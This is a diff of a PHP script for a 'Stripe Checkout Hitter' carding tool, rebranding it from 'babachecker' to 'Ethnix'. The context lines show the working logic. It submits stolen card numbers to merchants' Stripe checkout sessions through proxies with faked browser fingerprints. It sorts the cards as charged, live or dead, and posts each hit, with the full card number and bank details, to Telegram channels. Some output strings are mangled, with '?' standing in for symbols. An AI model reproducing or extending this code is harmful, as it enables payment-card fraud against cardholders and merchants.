@@ -20,7 +20,7 @@ $userLastName = $userData['last_name'] ?? '';
 $userStatus = strtoupper($userData['status'] ?? 'FREE');
 $userFullName = trim($userFirstName . ($userLastName ? ' ' . $userLastName : ''));
 $currentCredits = (int)$userData['credits'];
-if ($userStatus === 'BANNED') {echo json_encode(['Response' => 'You are banned from using babachecker.']);exit;}
+if ($userStatus === 'BANNED') {echo json_encode(['Response' => 'You are banned from using Ethnix.']);exit;}
 // if ($userStatus === 'FREE') {echo json_encode(['Response' => 'This API is only usable for Premium or Admin Users. Please upgrade your Plan.']);exit;}
 if ($currentCredits < 2) {echo json_encode(['Response' => 'Insufficient Credits']);exit;}
 $proxyHost = $_GET['host'] ?? '';
@@ -259,7 +259,7 @@ retry:
         if (isset($json['error'])) {
             $errorCode = $json['error']['code'];
             $errorMessage = $json['error']['message'];
-            return ['result_status' => 'dead','response_msg' => "[ Payment Failed ] » [$errorCode » $errorMessage]",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];
+            return ['result_status' => 'dead','response_msg' => "[ Payment Failed ] ? [$errorCode ? $errorMessage]",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];
         } else {
             $initChecksum = $json['init_checksum'];
             $coname = $json['account_settings']['display_name'];
@@ -291,7 +291,7 @@ retry:
         $newpm_enc = get_js_encoded_string($pm);
     } else {
         $message = isset($json['error']['message']) ? $json['error']['message'] : '';
-        if ($message) {return ['result_status' => 'dead','response_msg' => "[ Payment Failed ] » [$message]",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];} elseif (strpos($response, 'You passed')) {if ($count < $maxRetries) {$count++;goto retry;}}
+        if ($message) {return ['result_status' => 'dead','response_msg' => "[ Payment Failed ] ? [$message]",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];} elseif (strpos($response, 'You passed')) {if ($count < $maxRetries) {$count++;goto retry;}}
     }
     $ch = curl_init();
     if ($proxyRequired) {curl_setopt($ch, CURLOPT_PROXY, $proxy);curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);}
@@ -320,7 +320,7 @@ retry:
     elseif (strpos($response, 'insufficient_funds')) {return ['result_status' => 'live','response_msg' => 'Insufficient Funds','merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
     elseif (strpos($response, '"verification_url": "')) {return ['result_status' => 'dead','response_msg' => 'HCAPTCHA Not Bypassed','merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
     elseif (empty($response)) {if ($count < $maxRetries) {$count++;goto retry;}}
-    elseif ($message) {return ['result_status' => 'dead','response_msg' => "[ Payment Failed ] » [$dcode : $code » $message]",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
+    elseif ($message) {return ['result_status' => 'dead','response_msg' => "[ Payment Failed ] ? [$dcode : $code ? $message]",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
     $headers = ['accept: application/json','content-type: application/x-www-form-urlencoded','referer: https://js.stripe.com/','user-agent: ' . $ua,'origin: https://js.stripe.com',];
     $data = ['source' => $payatt,'browser' => '{"fingerprintAttempted":true,"fingerprintData":"' . $enc_server . '","challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"'.$browserLanguage.'","browserColorDepth":"'.$browserColorDepth.'","browserScreenHeight":"'.$browserScreenHeight.'","browserScreenWidth":"'.$browserScreenWidth.'","browserTZ":"'.$browserTZ.'","browserUserAgent":"'.$ua.'"}','one_click_authn_device_support[hosted]' => 'false','one_click_authn_device_support[same_origin_frame]' => 'false','one_click_authn_device_support[spc_eligible]' => 'true','one_click_authn_device_support[webauthn_eligible]' => 'true','one_click_authn_device_support[publickey_credentials_get_allowed]' => 'true','key' => $pkLive];
     $ch = curl_init();
@@ -335,7 +335,7 @@ retry:
     $json = json_decode($response, true);
     if ($json && isset($json['state'])) {
         $state = $json['state'];
-        if ($state === 'challenge_required') {return ['result_status' => 'dead','response_msg' => "[ 3DS BIN ] » [$state]",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
+        if ($state === 'challenge_required') {return ['result_status' => 'dead','response_msg' => "[ 3DS BIN ] ? [$state]",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
     }
     $ch = curl_init();
     if ($proxyRequired) {curl_setopt($ch, CURLOPT_PROXY, $proxy);curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);}
@@ -356,7 +356,7 @@ retry:
     elseif (strpos($result, 'verify_challenge')) {return ['result_status' => 'dead','response_msg' => '[ HCAPTCHA Not Bypassed]','merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
     elseif (strpos($result, 'authentication_challenge')) {return ['result_status' => 'dead','response_msg' => '[ OTP CC ]','merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
     elseif (strpos($result, 'Unrecognized')) {if ($count < $maxRetries) {$count++;goto retry;}}
-    else {$msg = $message ?: $errormes ?: 'Payment Failed';return ['result_status' => 'dead','response_msg' => "[ Payment Failed ] » [$dcode : $code » $msg]",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
+    else {$msg = $message ?: $errormes ?: 'Payment Failed';return ['result_status' => 'dead','response_msg' => "[ Payment Failed ] ? [$dcode : $code ? $msg]",'merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];}
     return ['result_status' => 'dead','response_msg' => 'Payment Failed','merchant' => $coname,'price' => strtoupper($currency) . ' ' . $amttt,'productName' => $items,'receipt' => $surl];
 }
 $rawResult = stripeCheckoutHitRaw($cc,$month,$year,$cvv,$pk_live,$cs_live,$emailIn,$proxyRequired,$proxyHost,$proxyPort,$proxyUsername,$proxyPassword);
@@ -368,17 +368,17 @@ $productName = $rawResult['productName'] ?? 'Unknown';
 $receipt = $rawResult['receipt'] ?? 'N/A';
 if ($status === 'charge') {
     $newCredits = updateCredits($pdo, $uid, 5, $currentCredits, false, true);
-    $fullResult = "<b>#StripeCOHitter</b>\n???????????\n[?] <b>Card ?</b> <code>{$cc1}</code>\n[?] <b>Status ?</b> Charged ??\n[?] <b>Response ?</b> {$msg}\n???????????\n[?] <b>Merchant ?</b> {$merchant}\n[?] <b>Price ?</b> {$price}\n[?] <b>Product ?</b> {$productName}\n[?] <b>Receipt ?</b> {$receipt}\n???????????\n[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n[?] <b>Bank ?</b> {$binInfo['issuer']}\n[?] <b>Country ?</b> {$binInfo['country_info']}\n???????????\n[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n[?] <b>Dev ?</b> babachecker";
+    $fullResult = "<b>#StripeCOHitter</b>\n???????????\n[?] <b>Card ?</b> <code>{$cc1}</code>\n[?] <b>Status ?</b> Charged ??\n[?] <b>Response ?</b> {$msg}\n???????????\n[?] <b>Merchant ?</b> {$merchant}\n[?] <b>Price ?</b> {$price}\n[?] <b>Product ?</b> {$productName}\n[?] <b>Receipt ?</b> {$receipt}\n???????????\n[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n[?] <b>Bank ?</b> {$binInfo['issuer']}\n[?] <b>Country ?</b> {$binInfo['country_info']}\n???????????\n[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n[?] <b>Dev ?</b> Ethnix";
     if (!empty($telegramId)) {sendTelegramMessage($botToken, $telegramId, $fullResult);}
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
-    $publicMessage = "<b>Hit Detected ?</b>\n????????\n<b>User ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n<b>Status ?</b> <b>Charged ??</b>\n<b>Response ?</b> {$msg} {$price} ??\n<b>Gateway ?</b> Stripe Checkout Hitter\n???????????\n<b>Hit From ?</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+    $publicMessage = "<b>Hit Detected ?</b>\n????????\n<b>User ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n<b>Status ?</b> <b>Charged ??</b>\n<b>Response ?</b> {$msg} {$price} ??\n<b>Gateway ?</b> Stripe Checkout Hitter\n???????????\n<b>Hit From ?</b> <a href=\"https://ethnix.net\">Ethnix</a>";
 
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
     echo json_encode(['status' => 'charge','Response' => $msg,'Gateway' => 'Stripe Checkout Hitter','cc' => $cc1,'credits' => $newCredits,'merchant' => $merchant,'price' => $price,'productName' => $productName,'receipt' => $receipt,'brand' => $binInfo['brand'],'card_type' => $binInfo['card_type'],'level' => $binInfo['level'],'issuer' => $binInfo['issuer'],'country_info' => $binInfo['country_info']]);
     exit;
 } elseif ($status === 'live') {
     $newCredits = updateCredits($pdo, $uid, 3, $currentCredits, true, false);
-    $fullResult = "<b>#StripeCOHitter</b>\n???????????\n[?] <b>Card ?</b> <code>{$cc1}</code>\n[?] <b>Status ?</b> Live ?\n[?] <b>Response ?</b> {$msg}\n???????????\n[?] <b>Merchant ?</b> {$merchant}\n[?] <b>Price ?</b> {$price}\n[?] <b>Product ?</b> {$productName}\n[?] <b>Receipt ?</b> {$receipt}\n???????????\n[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n[?] <b>Bank ?</b> {$binInfo['issuer']}\n[?] <b>Country ?</b> {$binInfo['country_info']}\n???????????\n[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n[?] <b>Dev ?</b> babachecker";
+    $fullResult = "<b>#StripeCOHitter</b>\n???????????\n[?] <b>Card ?</b> <code>{$cc1}</code>\n[?] <b>Status ?</b> Live ?\n[?] <b>Response ?</b> {$msg}\n???????????\n[?] <b>Merchant ?</b> {$merchant}\n[?] <b>Price ?</b> {$price}\n[?] <b>Product ?</b> {$productName}\n[?] <b>Receipt ?</b> {$receipt}\n???????????\n[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n[?] <b>Bank ?</b> {$binInfo['issuer']}\n[?] <b>Country ?</b> {$binInfo['country_info']}\n???????????\n[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n[?] <b>Dev ?</b> Ethnix";
     if (!empty($telegramId)) {sendTelegramMessage($botToken, $telegramId, $fullResult);}
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     echo json_encode(['status' => 'live','Response' => $msg,'Gateway' => 'Stripe Checkout Hitter','cc' => $cc1,'credits' => $newCredits,'merchant' => $merchant,'price' => $price,'productName' => $productName,'receipt' => $receipt,'brand' => $binInfo['brand'],'card_type' => $binInfo['card_type'],'level' => $binInfo['level'],'issuer' => $binInfo['issuer'],'country_info' => $binInfo['country_info']]);
